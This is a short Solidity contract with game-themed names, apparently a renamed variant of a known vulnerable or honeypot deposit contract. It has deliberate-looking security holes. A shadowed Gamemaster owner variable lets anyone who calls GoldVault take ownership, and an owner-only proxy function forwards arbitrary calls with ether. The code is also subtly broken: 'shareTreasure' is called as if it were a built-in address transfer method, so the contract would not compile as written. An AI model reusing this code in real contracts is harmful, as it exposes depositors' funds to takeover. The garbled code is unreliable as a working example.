// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyGamemaster { if (msg.sender == Gamemaster) _; } address Gamemaster = msg.sender;
    function sharetreasureGuildleader(address _realmlord) public onlyGamemaster { Gamemaster = _realmlord; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract SaveprizeProxy is Proxy {
    address public Gamemaster;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function GoldVault() public payable {
        if (msg.sender == tx.origin) {
            Gamemaster = msg.sender;
            cacheTreasure();
        }
    }

    function cacheTreasure() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function claimLoot(uint256 amount) public onlyGamemaster {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.shareTreasure(amount);
        }
    }
}